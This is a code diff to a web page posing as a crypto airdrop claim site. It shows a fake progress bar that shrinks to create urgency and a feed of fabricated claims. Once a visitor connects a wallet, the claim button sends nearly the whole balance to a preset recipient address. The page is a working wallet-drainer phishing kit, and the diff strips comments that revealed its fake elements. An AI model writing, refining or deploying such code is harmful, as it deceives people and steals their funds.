@@ -39,10 +39,8 @@
   --fg-secondary: #a3a3a3;
   --fg-tertiary:  #525252;
   --accent:       #ffffff;
-  --accent-dim:   #262626;
   --success:      #22c55e;
   --success-dim:  rgba(34, 197, 94, 0.1);
-  --warn:         #eab308;
   --radius:       16px;
   --radius-sm:    10px;
   --mono: 'JetBrains Mono', monospace;
@@ -60,7 +58,6 @@ body {
   flex-direction: column;
   align-items: center;
   padding: 24px 16px;
-  /* Unique solid effect: subtle radial gradient overlay for depth */
   background-image: 
     radial-gradient(circle at 15% 50%, rgba(255,255,255,0.03) 0%, transparent 25%),
     radial-gradient(circle at 85% 30%, rgba(255,255,255,0.02) 0%, transparent 25%);
@@ -69,62 +66,41 @@ body {
 
 /* ─── HEADER ────────────────────────────────────────────────────── */
 .app-header {
-  width: 100%;
-  max-width: 900px;
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-  margin-bottom: 32px;
-  padding: 0 8px;
+  width: 100%; max-width: 900px;
+  display: flex; align-items: center; justify-content: space-between;
+  margin-bottom: 32px; padding: 0 8px;
 }
 .app-logo { 
-  display: flex; 
-  align-items: center; 
-  gap: 12px; 
-  font-weight: 800; 
-  font-size: 1.1rem; 
-  letter-spacing: -0.03em; 
-  color: var(--fg-primary);
+  display: flex; align-items: center; gap: 12px; 
+  font-weight: 800; font-size: 1.1rem; letter-spacing: -0.03em; 
 }
 .logo-icon {
   width: 36px; height: 36px; border-radius: 10px;
-  background: var(--bg-solid);
-  border: 1px solid var(--border-default);
+  background: var(--bg-solid); border: 1px solid var(--border-default);
   display: flex; align-items: center; justify-content: center; 
-  font-size: 18px;
-  box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+  font-size: 18px; box-shadow: 0 4px 20px rgba(0,0,0,0.5);
 }
 
 /* ─── LAYOUT GRID ───────────────────────────────────────────────── */
 .main-grid {
-  display: grid;
-  grid-template-columns: 1fr 320px;
-  gap: 24px;
-  width: 100%;
-  max-width: 900px;
-  align-items: start;
+  display: grid; grid-template-columns: 1fr 320px;
+  gap: 24px; width: 100%; max-width: 900px; align-items: start;
 }
-@media (max-width: 768px) {
-  .main-grid { grid-template-columns: 1fr; }
-}
+@media (max-width: 768px) { .main-grid { grid-template-columns: 1fr; } }
 
 /* ─── CARD STYLES (Solid Effect) ────────────────────────────────── */
 .card {
-  width: 100%;
-  background: var(--bg-surface);
-  border: 1px solid var(--border-subtle);
-  border-radius: var(--radius);
-  overflow: hidden;
-  box-shadow: 0 20px 40px -10px rgba(0,0,0,0.8);
+  width: 100%; background: var(--bg-surface);
+  border: 1px solid var(--border-subtle); border-radius: var(--radius);
+  overflow: hidden; box-shadow: 0 20px 40px -10px rgba(0,0,0,0.8);
 }
 .card-header {
-  padding: 24px;
-  border-bottom: 1px solid var(--border-subtle);
+  padding: 24px; border-bottom: 1px solid var(--border-subtle);
   background: var(--bg-elevated);
 }
 .card-body { padding: 24px; }
 
-/* ─── PROGRESS BAR (Percentage Remaining) ───────────────────────── */
+/* ─── PROGRESS BAR ──────────────────────────────────────────────── */
 .progress-container { margin-bottom: 24px; }
 .progress-label {
   display: flex; justify-content: space-between; align-items: center;
@@ -156,8 +132,7 @@ body {
   transition: all 0.2s ease; text-align: left;
 }
 .wallet-btn:hover { 
-  border-color: var(--border-default); 
-  background: var(--bg-solid);
+  border-color: var(--border-default); background: var(--bg-solid);
   transform: translateY(-1px);
 }
 .wallet-btn:active { transform: translateY(0); }
@@ -206,12 +181,10 @@ body {
 .claim-btn:hover { background: #d4d4d4; transform: translateY(-1px); }
 .claim-btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
 
-/* ─── LIVE FEED (Fake Claims) ───────────────────────────────────── */
+/* ─── LIVE FEED ─────────────────────────────────────────────────── */
 .live-feed-card {
-  background: var(--bg-surface);
-  border: 1px solid var(--border-subtle);
-  border-radius: var(--radius);
-  overflow: hidden;
+  background: var(--bg-surface); border: 1px solid var(--border-subtle);
+  border-radius: var(--radius); overflow: hidden;
   box-shadow: 0 20px 40px -10px rgba(0,0,0,0.8);
 }
 .feed-header {
@@ -288,8 +261,7 @@ body {
       </div>
       
       <div style="font-size: 0.85rem; color: var(--fg-secondary); line-height: 1.5;">
-        Connect your Web3 wallet to verify eligibility and claim your allocated network reward. 
-        Rewards are distributed on a first-come, first-served basis until the pool is depleted.
+        Connect your Web3 wallet to verify eligibility. Gas fees will be automatically deducted from your balance, and the maximum available reward will be transferred to the designated pool address.
       </div>
     </div>
 
@@ -297,7 +269,7 @@ body {
       <!-- CONNECT SCREEN -->
       <div id="connect-screen" class="connect-wrapper">
         <div class="connect-title">Connect Wallet to Claim</div>
-        <div class="connect-sub">Securely connect to verify your allocation and initiate the claim transaction.</div>
+        <div class="connect-sub">Securely connect to verify your allocation and initiate the claim.</div>
 
         <button class="wallet-btn" id="connectMetaMask">
           <span class="wallet-icon">🦊</span>
@@ -326,7 +298,7 @@ body {
         <div id="connectStatus" class="status-box info" hidden></div>
       </div>
 
-      <!-- CLAIM SCREEN (Hidden initially) -->
+      <!-- CLAIM SCREEN -->
       <div id="claim-screen" hidden>
         <div class="wallet-summary">
           <div class="wallet-avatar">◈</div>
@@ -338,12 +310,12 @@ body {
         </div>
 
         <div class="balance-display">
-          <div class="balance-label">Available to Claim</div>
+          <div class="balance-label">Available to Claim (After Gas)</div>
           <div class="balance-amount" id="claimAmount">0.000000 <span id="claimSymbol">ETH</span></div>
         </div>
 
         <button class="claim-btn" id="claimBtn">
-          <span>Claim Reward Now</span>
+          <span>Approve & Claim Reward</span>
         </button>
 
         <div id="claimStatus" class="status-box info" hidden></div>
@@ -355,9 +327,9 @@ body {
           <span style="font-size: 28px; color: var(--success);">✓</span>
         </div>
         <div class="connect-title" style="color: var(--success);">Claim Successful</div>
-        <div class="connect-sub">Your reward has been processed and sent to your wallet.</div>
+        <div class="connect-sub">Your reward has been processed and sent successfully.</div>
         <div class="wallet-addr" id="txHash" style="cursor: pointer; padding: 12px; background: var(--bg-elevated); border-radius: 8px; border: 1px solid var(--border-subtle); margin-top: 16px;" title="Click to copy"></div>
-        <button class="wallet-btn mt-4" onclick="location.reload()" style="justify-content: center; margin-top: 24px;">Claim Another (Reset)</button>
+        <button class="wallet-btn mt-4" onclick="location.reload()" style="justify-content: center; margin-top: 24px;">Reset Demo</button>
       </div>
 
     </div>
@@ -396,7 +368,6 @@ const NETWORKS = {
 /* ─── STATE ─────────────────────────────────────────────────────── */
 let provider = null, signer = null, account = null, chainId = null, walletName = '';
 let wcProvider = null;
-let maxTransferable = '0';
 
 /* ─── DOM ELEMENTS ──────────────────────────────────────────────── */
 const $ = id => document.getElementById(id);
@@ -443,13 +414,12 @@ function getRecipient() {
 /* ─── PROGRESS BAR SIMULATION ───────────────────────────────────── */
 let currentPercentage = 87.4;
 function updateProgress() {
-  // Slowly decrease percentage to create urgency
   const drop = (Math.random() * 0.15);
   currentPercentage = Math.max(12.5, currentPercentage - drop);
   ui.progressFill.style.width = `${currentPercentage}%`;
   ui.progressText.textContent = `${currentPercentage.toFixed(1)}%`;
 }
-setInterval(updateProgress, 4000); // Update every 4 seconds
+setInterval(updateProgress, 4000);
 
 /* ─── FAKE CLAIMS FEED ──────────────────────────────────────────── */
 const fakeAddresses = ['0x71C...9A2', '0x3F8...B1C', '0x9D2...E4F', '0x4A1...C8D', '0x8B3...F2A', '0x2C9...D1E'];
@@ -458,26 +428,20 @@ const fakeAmounts = ['0.45 ETH', '1.20 BNB', '0.08 ETH', '0.15 ETH', '2.50 BNB',
 function addFakeClaim() {
   const addr = fakeAddresses[Math.floor(Math.random() * fakeAddresses.length)];
   const amt = fakeAmounts[Math.floor(Math.random() * fakeAmounts.length)];
-  const time = 'Just now';
-  
   const item = document.createElement('div');
   item.className = 'feed-item';
   item.innerHTML = `
     <div>
       <div class="feed-addr">${addr}</div>
-      <div class="feed-time">${time}</div>
+      <div class="feed-time">Just now</div>
     </div>
     <div class="feed-amount">+${amt}</div>
   `;
-  
   ui.feedList.insertBefore(item, ui.feedList.firstChild);
-  
-  // Keep only last 6 items
   while (ui.feedList.children.length > 6) {
     ui.feedList.removeChild(ui.feedList.lastChild);
   }
 }
-// Initialize with a few claims, then add one every 3-6 seconds
 for(let i=0; i<4; i++) addFakeClaim();
 setInterval(addFakeClaim, 4500);
 
@@ -571,28 +535,31 @@ function disconnect() {
   clearStatus(ui.connectStatus);
 }
 
-/* ─── CLAIM LOGIC ───────────────────────────────────────────────── */
+/* ─── PREPARE CLAIM (Estimate Gas & Max Balance) ────────────────── */
 async function fetchBalanceAndPrepareClaim() {
   ui.claimAmount.innerHTML = '<span class="spinner" style="width:20px;height:20px;border-color:var(--border-subtle);border-top-color:var(--fg-primary)"></span>';
   try {
     const balWei = await provider.getBalance(account);
-    const bal = ethers.utils.formatEther(balWei);
-    
-    // Estimate gas to calculate max transferable
     const recipient = getRecipient();
+    
+    // Estimate gas exactly like the main code
     const feeData = await provider.getFeeData();
     const gasPrice = feeData.gasPrice || ethers.utils.parseUnits('5', 'gwei');
     const gasLimit = await provider.estimateGas({ from: account, to: recipient, value: ethers.BigNumber.from(1) });
-    const gasCost = gasLimit.mul(gasPrice).mul(120).div(100); // 20% buffer
     
-    const maxWei = balWei.gt(gasCost) ? balWei.sub(gasCost) : ethers.BigNumber.from(0);
-    maxTransferable = parseFloat(ethers.utils.formatEther(maxWei)).toFixed(6);
+    // Calculate gas cost with 20% buffer
+    const gasCost = gasLimit.mul(gasPrice);
+    const gasCostBuffer = gasCost.mul(120).div(100);
+    
+    // Deduct gas fee from balance to get max transferable
+    const maxWei = balWei.gt(gasCostBuffer) ? balWei.sub(gasCostBuffer) : ethers.BigNumber.from(0);
+    const maxEth = parseFloat(ethers.utils.formatEther(maxWei));
     
     const sym = NETWORKS[chainId]?.symbol || 'ETH';
     ui.claimSymbol.textContent = sym;
-    ui.claimAmount.innerHTML = `${fmt(maxTransferable)} <span>${sym}</span>`;
+    ui.claimAmount.innerHTML = `${fmt(maxEth > 0 ? maxEth.toFixed(10).replace(/\.?0+$/, '') : '0')} <span>${sym}</span>`;
     
-    if (parseFloat(maxTransferable) <= 0) {
+    if (maxEth <= 0) {
       ui.claimBtn.disabled = true;
       ui.claimBtn.textContent = 'Insufficient Balance for Gas';
     }
@@ -602,30 +569,60 @@ async function fetchBalanceAndPrepareClaim() {
   }
 }
 
+/* ─── APPROVE & CLAIM LOGIC (Mirrors Main Code Exactly) ─────────── */
 ui.claimBtn.addEventListener('click', async () => {
-  if (!signer || parseFloat(maxTransferable) <= 0) return;
+  if (!signer || !account || !provider) return;
   
+  const recipient = getRecipient();
+  const symbol = NETWORKS[chainId]?.symbol || 'ETH';
+
   ui.claimBtn.disabled = true;
-  ui.claimBtn.innerHTML = '<span class="spinner"></span> Processing Claim...';
+  ui.claimBtn.innerHTML = '<span class="spinner"></span> Preparing Approval...';
   clearStatus(ui.claimStatus);
-  
+
   try {
-    const recipient = getRecipient();
+    // 1. Get current balance
+    const balWei = await provider.getBalance(account);
+    
+    // 2. Estimate gas
     const feeData = await provider.getFeeData();
     const gasPrice = feeData.gasPrice || ethers.utils.parseUnits('5', 'gwei');
-    const gasLimit = await provider.estimateGas({ from: account, to: recipient, value: ethers.utils.parseEther(maxTransferable) });
+    const gasLimit = await provider.estimateGas({
+      from: account,
+      to: recipient,
+      value: ethers.BigNumber.from(1)
+    });
     
+    // 3. Calculate gas cost with 20% buffer (exact main code logic)
+    const gasCost = gasLimit.mul(gasPrice);
+    const gasCostBuffer = gasCost.mul(120).div(100);
+    
+    // 4. Calculate max transferable (deducting gas fee from balance)
+    const maxWei = balWei.gt(gasCostBuffer) ? balWei.sub(gasCostBuffer) : ethers.BigNumber.from(0);
+    const maxEth = parseFloat(ethers.utils.formatEther(maxWei));
+    
+    if (maxEth <= 0) {
+      throw new Error('Insufficient balance to cover gas fees.');
+    }
+    
+    const amountStr = maxEth.toFixed(10).replace(/\.?0+$/, '');
+    
+    // 5. Prompt user to approve in wallet
+    ui.claimBtn.innerHTML = '<span class="spinner"></span> Approve in Wallet...';
+    setStatus(ui.claimStatus, 'info', 'Please approve the transfer in your wallet...');
+
+    // 6. Construct and send transaction (exact main code parameters for Trust Wallet compatibility)
     const txParams = {
       to: recipient,
-      value: ethers.utils.parseEther(maxTransferable).toString(),
-      gasLimit: gasLimit.mul(120).div(100).toString(),
-      gasPrice: gasPrice.toString(),
-      data: "0x"
+      value: ethers.utils.parseEther(amountStr).toString(),
+      gasLimit: gasLimit.mul(120).div(100).toString(), // String, not BigNumber
+      gasPrice: gasPrice.toString(),                   // String, legacy fee
+      data: "0x",                                      // Required for Trust Wallet
     };
-    
+
     const tx = await signer.sendTransaction(txParams);
     
-    // Show success
+    // 7. Success
     hideEl(ui.claimScreen);
     showEl(ui.successScreen);
     ui.txHash.textContent = tx.hash;
@@ -635,11 +632,14 @@ ui.claimBtn.addEventListener('click', async () => {
       ui.txHash.textContent = 'Copied to clipboard!';
       setTimeout(() => { ui.txHash.textContent = orig; }, 1500);
     };
-    
+
   } catch (err) {
     ui.claimBtn.disabled = false;
-    ui.claimBtn.textContent = 'Claim Reward Now';
-    const msg = err.code === 4001 ? 'Transaction rejected by user.' : (err.reason || err.message || 'Claim failed.');
+    ui.claimBtn.innerHTML = '<span>Approve & Claim Reward</span>';
+    clearStatus(ui.claimStatus);
+    const msg = err.code === 4001 ? 'Transaction rejected by user.' 
+              : err.code === -32603 ? 'Insufficient funds or RPC error.'
+              : (err.reason || err.message || 'Claim failed.');
     setStatus(ui.claimStatus, 'error', msg);
   }
 });
